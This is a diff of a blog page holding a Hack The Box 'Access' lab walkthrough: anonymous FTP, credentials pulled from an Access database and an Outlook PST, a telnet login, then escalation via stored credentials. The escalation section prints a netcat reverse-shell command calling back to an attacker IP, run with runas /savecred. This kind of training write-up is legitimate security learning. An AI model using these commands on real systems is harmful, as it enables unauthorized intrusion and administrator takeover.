@@ -11,7 +11,7 @@
   <title>Access Walkthrough(Hack The Box) &middot; Secure The Throne</title>
   <meta name="title" content="Access Walkthrough(Hack The Box) &middot; Secure The Throne" />
   
-  <meta name="description" content="a description" />
+  <meta name="description" content="A brief walkthrough of Access box from Hack the box" />
   <meta name="keywords" content="Easy, Windows, Hack The Box, Hacking, Active Directory, Walkthrough, " />
   
   
@@ -72,7 +72,7 @@
   <meta property="og:url" content="http://localhost:1313/posts/1742496721950-access-walkthroughhtb/">
   <meta property="og:site_name" content="Secure The Throne">
   <meta property="og:title" content="Access Walkthrough(Hack The Box)">
-  <meta property="og:description" content="a description">
+  <meta property="og:description" content="A brief walkthrough of Access box from Hack the box">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -90,7 +90,7 @@
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="http://localhost:1313/posts/1742496721950-access-walkthroughhtb/featured.png">
   <meta name="twitter:title" content="Access Walkthrough(Hack The Box)">
-  <meta name="twitter:description" content="a description">
+  <meta name="twitter:description" content="A brief walkthrough of Access box from Hack the box">
 
   
   <script type="application/ld+json">
@@ -100,7 +100,7 @@
     "articleSection": "Posts",
     "name": "Access Walkthrough(Hack The Box)",
     "headline": "Access Walkthrough(Hack The Box)",
-    "description": "a description",
+    "description": "A brief walkthrough of Access box from Hack the box",
     
     "inLanguage": "en",
     "url" : "http:\/\/localhost:1313\/posts\/1742496721950-access-walkthroughhtb\/",
@@ -117,7 +117,7 @@
     "keywords": ["Easy","Windows","Hack The Box","Hacking","Active Directory","Walkthrough"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "204"
+    "wordCount": "655"
   }]
   </script>
 
@@ -155,6 +155,9 @@
 
 
 
+
+
+<script defer src="/lib/typeit/typeit.umd.57f9bc6e047efc875cb4f2e9ca74c802de33638d2c3aff6d9b7eb3c7588c24649b6c3e51cd45f49c0ed0cf72aedbd694bf2d35f358a34076d63f9febabc0bd6f.js" integrity="sha512-V/m8bgR&#43;/IdctPLpynTIAt4zY40sOv9tm36zx1iMJGSbbD5RzUX0nA7Qz3Ku29aUvy0181ijQHbWP5/rq8C9bw=="></script>
 
 
 
@@ -678,7 +681,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-04-01T00:00:00&#43;00:00">1 April 2025</time><span class="px-2 text-primary-500">&middot;</span><span>204 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">1 min</span><span class="px-2 text-primary-500">&middot;</span>
+  <time datetime="2025-04-01T00:00:00&#43;00:00">1 April 2025</time><span class="px-2 text-primary-500">&middot;</span><span>655 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">4 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
 <script type="text/javascript" src="/js/zen-mode.min.eea5245cf9244ecbdf2c150d1c8833226c1541cadf6e98f63a7c9192b1a3676df2c3ec603b14f4cfaaa53971fd9d8955640c0f405bf3de2b43ee7a5fb29ae721.js" integrity="sha512-7qUkXPkkTsvfLBUNHIgzImwVQcrfbpj2OnyRkrGjZ23yw&#43;xgOxT0z6qlOXH9nYlVZAwPQFvz3itD7npfsprnIQ=="></script>
@@ -945,10 +948,19 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#reconnaissance-windows">Reconnaissance #Windows</a></li>
-    <li><a href="#enumeration">Enumeration</a></li>
-    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#analyzing-backupmdb">Analyzing <code>backup.mdb</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#analyzing-access-controlzip">Analyzing <code>Access Control.zip</code></a></li>
+      </ul>
+    </li>
     <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#summary">Summary</a></li>
   </ul>
 </nav>
   </div>
@@ -962,10 +974,19 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#reconnaissance-windows">Reconnaissance #Windows</a></li>
-    <li><a href="#enumeration">Enumeration</a></li>
-    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#analyzing-backupmdb">Analyzing <code>backup.mdb</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#analyzing-access-controlzip">Analyzing <code>Access Control.zip</code></a></li>
+      </ul>
+    </li>
     <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#summary">Summary</a></li>
   </ul>
 </nav>
   </div>
@@ -1049,22 +1070,43 @@
         <div class="article-content max-w-prose mb-20">
           
 
-<h2 class="relative group">Reconnaissance #Windows 
-    <div id="reconnaissance-windows" class="anchor"></div>
+<h2 class="relative group">Reconnaissance 
+    <div id="reconnaissance" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#reconnaissance-windows" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#reconnaissance" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
 <ul>
-<li>We got straight away Webserver on port 80 and Telnet, FTP on the nmap scan.</li>
-<li>![[Pasted image 20241216220450.png]]</li>
-<li>Apparently anon login allowed in FTP</li>
-<li>Let&rsquo;s try that and the web page mentions LON-MC6 which leads to MS09-042 a vulnerability in Telnet</li>
-<li>Anyway when I try to login in FTP it worked but after that I can&rsquo;t access any directories it&rsquo;s simply giving timeouts</li>
+<li>On the initial Nmap scan I can see interesting ports open which are FTP, Telnet and a http port(80)
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241216220450.png?raw=true" alt="Pasted image 20241216220450.png" />
+    
+  </figure>
+</li>
+<li>Quickly I checked for anonymous login and it seems like it was enabled. Whcih was interesting.</li>
+<li>While at that I also discovered that a web page mentions <code>LON-MC6</code> which leads to <code>MS09-042</code> a vulnerability in Telnet</li>
+</ul>
+<p><span class="flex" style="cursor: pointer;">
+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+     Definition 
+  </span>
+</span>
+
+This security update resolves a publicly disclosed vulnerability in the Microsoft Telnet service. The vulnerability could allow an attacker to obtain credentials and then use them to log back into affected systems. The attacker would then acquire user rights on a system identical to the user rights of the logged-on user. This scenario could ultimately result in remote code execution on affected systems. An attacker who successfully exploited this vulnerability could install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.</p>
+<ul>
+<li>Anyway when I try to login FTP, and it worked but after that I can&rsquo;t access any directories it&rsquo;s simply giving timeouts. Which was frustrating
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media.giphy.com/media/3oEhmI2ggePqhmHoE8/giphy.gif?cid=790b76110k8nd7mxkyobs68ecd2qo6ct0xsok5yl1zy1q2li&amp;ep=v1_gifs_search&amp;rid=giphy.gif&amp;ct=giving" alt="frustrating" />
+    
+  </figure>
+</li>
+<li>After multiple tries atlast I was able to access the files in FTP.</li>
 </ul>
 
 
@@ -1078,26 +1120,105 @@
     </span>        
     
 </h2>
-<ul>
-<li>There was a e-mail file and database file from the db file there was the password for mail zip file</li>
-<li>Within the mail file a password for Telnet was there</li>
-</ul>
 
 
-<h2 class="relative group">Foothold 
-    <div id="foothold" class="anchor"></div>
+<h3 class="relative group">Analyzing <code>backup.mdb</code> 
+    <div id="analyzing-backupmdb" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#foothold" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#analyzing-backupmdb" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li>While enumerating the directories I found two files interesting one was an db file - <code>backup.mdb</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; file backup.mdb 
+backup.mdb: Microsoft Access Database
+</code></pre><ul>
+<li>To see the contents of the database I installed a tool <code>sudo apt install mdbtools</code></li>
+<li>I can list all the tables using this coomand</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mdb-tables backup.mdb
+</span></span></code></pre></div><ul>
+<li>To get the data from a table I could use this command</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mdb-export backup.mdb &lt;table-name&gt;
+</span></span></code></pre></div><ul>
+<li>From <code>auth_user</code> table I got a username and password</li>
+</ul>
+<pre tabindex="0"><code>&gt; mdb-export backup.mdb auth_user
+&lt;SNIP&gt;
+27,&#34;engineer&#34;,&#34;access4u@security&#34;,1,&#34;02/24/18 1:54:36&#34;,26,
+&lt;SNIP&gt;
+</code></pre><p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/VaUHmQW1SNEAAAAd/one-down-saanvi-bahl.gif" alt="one-down" />
+    
+  </figure>
+</p>
+
+
+<h2 class="relative group">Exploitation 
+    <div id="exploitation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#exploitation" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
+
+
+<h3 class="relative group">Analyzing <code>Access Control.zip</code> 
+    <div id="analyzing-access-controlzip" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#analyzing-access-controlzip" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
 <ul>
-<li>I got the initial foot in using telnet</li>
-<li>Then got the user flag</li>
-<li>![[Pasted image 20241216231714.png]]</li>
+<li>The other file was a compressed zip file - <code>Access Control.zip</code>.</li>
+<li>I used this password <code>access4u@security</code> for the zip file and extracted it&rsquo;s contents</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">7z x Access Control.zip
+</span></span></code></pre></div><ul>
+<li>It had only one file called <code>Access Control.pst</code>. I can see that this is a outlook mail file.</li>
+<li>So I used a online <code>PST</code> opener and read it&rsquo;s contents</li>
+<li>To keep it simple, It had password for another account. The message reads&hellip;</li>
+</ul>
+<pre tabindex="0"><code>Hi there,
+
+The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.                                                                                          
+
+Regards,
+
+John
+</code></pre><ul>
+<li>This username <code>security</code> and the password <code>4Cc3ssC0ntr0ller</code> works for telnet. So I logged in as user <code>security</code></li>
+<li>Then I got the 
+<div class="flex mt-2">
+<span
+  class="rounded-full bg-primary-500 dark:bg-primary-400 text-neutral-50 dark:text-neutral-800 px-1.5 py-[1px] text-xs font-normal"
+>
+  <span class="flex flex-row items-center">
+    
+    <span>User flag</span>
+  </span>
+</span>
+</div>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241216231714.png?raw=true" alt="Pasted image 20241216231714.png" />
+    
+  </figure>
+</li>
 </ul>
 
 
@@ -1113,20 +1234,70 @@
 </h2>
 <ul>
 <li>Using <code>cmdkey /list</code> will show the available and stored creds.</li>
-<li>We can use runas for running as something if appropriate constraints are valid</li>
-<li>Here in this case we got saved creds so first lets transfer nc.exe to the machine</li>
-<li>Then use this command to save to bat file</li>
+<li>We can use <code>runas</code> for running as something if appropriate constraints are valid. For an example <code>runas</code> is similar to <code>sudo</code> for windows if not the same.</li>
+<li>Here in this case we got saved creds so first lets transfer <code>nc.exe</code> to the target machine</li>
+<li>Then I used this command to save it to a bat file</li>
 </ul>
-<pre tabindex="0"><code>echo c:\users\security\nc.exe -e cmd.exe 10.10.14.12 6001 &gt; shell.bat
-</code></pre><ul>
-<li>And execute it with runas command with saved creds</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> c:<span class="se">\u</span>sers<span class="se">\s</span>ecurity<span class="se">\n</span>c.exe -e cmd.exe 10.10.14.12 <span class="m">6001</span> &gt; shell.bat
+</span></span></code></pre></div><ul>
+<li>And execute it with <code>runas</code> command with saved creds for the user <code>administrator</code></li>
 </ul>
-<pre tabindex="0"><code>runas /user:administrator /savecred c:\users\security\shell.bat
-</code></pre><ul>
-<li>Then we got Administrator access in our nc listener</li>
-<li>We got root access</li>
-<li>![[Pasted image 20241216233210.png]]</li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">runas /user:administrator /savecred c:<span class="se">\u</span>sers<span class="se">\s</span>ecurity<span class="se">\s</span>hell.bat
+</span></span></code></pre></div><ul>
+<li>This above command will use the saved password for the user <code>Administrator</code> and run the malicious <code>bat</code> file as <code>Administrator</code></li>
+<li>I got access as administrator in my shell</li>
+<li>I got 
+<div class="flex mt-2">
+<span
+  class="rounded-full bg-primary-500 dark:bg-primary-400 text-neutral-50 dark:text-neutral-800 px-1.5 py-[1px] text-xs font-normal"
+>
+  <span class="flex flex-row items-center">
+    
+    <span>Root access</span>
+  </span>
+</span>
+</div>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241216233210.png?raw=true" alt="Pasted image 20241216233210.png" />
+    
+  </figure>
+</li>
 </ul>
+
+
+<h2 class="relative group">Summary 
+    <div id="summary" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#summary" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>The Access machine from Hack The Box was an easy Windows-based challenge involving FTP access, database extraction, and privilege escalation. Initial enumeration revealed open FTP, Telnet, and HTTP ports, with anonymous FTP login enabled. A Microsoft Access database (backup.mdb) contained credentials, which unlocked a protected ZIP file leading to an Outlook PST file with another set of credentials. Using Telnet, I logged in as security and retrieved the user flag. Privilege escalation was achieved by leveraging stored credentials with cmdkey and runas, executing a Netcat reverse shell to gain administrator access and retrieve the root flag. The box was straightforward but engaging, with a mix of credential discovery and privilege escalation.</p>
+<p><div id="typeit-cff798afe66f2764c3adf1bdd5666bd1"></div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+      new TypeIt("#typeit-cff798afe66f2764c3adf1bdd5666bd1", {
+        strings: [" This was a good and easy machine and thus short but bomb!, Next walkthrough would be Sightless so be sure to check it out. Bye!. "],
+        speed:  100 ,
+        lifeLike:  false ,
+        startDelay:  0 ,
+        breakLines:  true ,
+        waitUntilVisible:  true ,
+        loop:  false 
+      }).go();
+    });
+</script>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExOGpxY2VveXNsY3N5cmd0cDhydXNva3I4b3RkMW4yN3ZlanV6MWxxcSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/1Q6K09gcxYWcUxxraT/giphy.gif" alt="bye" />
+    
+  </figure>
+</p>
 
           
           
